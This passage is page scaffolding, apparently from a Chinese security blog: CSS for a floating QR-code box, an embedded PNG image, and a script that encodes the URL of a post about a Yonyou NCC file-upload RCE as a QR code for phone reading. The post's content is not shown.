z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-LfwFileUploadServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 